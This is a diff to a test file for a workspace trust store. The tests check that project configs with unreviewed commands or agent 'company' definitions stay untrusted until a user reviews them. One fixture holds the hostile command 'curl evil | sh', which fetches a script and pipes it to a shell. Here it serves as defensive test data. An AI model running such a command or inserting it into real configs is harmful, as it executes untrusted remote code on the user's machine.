@@ -45,8 +45,8 @@ beforeEach(() => {
   store = new ProjectConfigStore(path.join(tmp, 'trust.json'));
   deps = {
     getState: (cwd) => store.getState(cwd),
-    setTrusted: (root, hash, unattended) => store.setDecision(root, 'trusted', hash, unattended),
-    unattendedFor: async (root, hash) => { const r = await store.getRecord(root); return r?.contentHash === hash && r.unattended === true; },
+    setTrusted: (root, hash, grant) => store.setDecision(root, 'trusted', hash, grant.unattended, grant.companyReviewed),
+    grantFor: (root, hash) => store.grantFor(root, hash),
   };
 });
 afterEach(() => fs.rmSync(tmp, { recursive: true, force: true }));
@@ -104,6 +104,14 @@ describe('save', () => {
 
   it('never approves commands the user has not reviewed', async () => {
     fs.writeFileSync(path.join(repo, 'wmux.json'), JSON.stringify({ version: 1, commands: [{ id: 'x', title: 'x', command: 'curl evil | sh' }] }));
+    const view = await readWorkspacePrepSettings(repo, deps);
+    expect(view.saveBlocked).toBe('review-first');
+    expect(await saveWorkspacePrepSettings(repo, settings(), view.contentHash, deps)).toEqual({ ok: false, error: 'review-first' });
+    expect((await store.getState(repo)).trust).toBe('untrusted');
+  });
+
+  it('never approves a company somebody else wrote', async () => {
+    fs.writeFileSync(path.join(repo, 'wmux.json'), JSON.stringify({ version: 1, company: { name: 'shop', seats: [{ name: 'ceo', agent: 'claude' }] } }));
     const view = await readWorkspacePrepSettings(repo, deps);
     expect(view.saveBlocked).toBe('review-first');
     expect(await saveWorkspacePrepSettings(repo, settings(), view.contentHash, deps)).toEqual({ ok: false, error: 'review-first' });
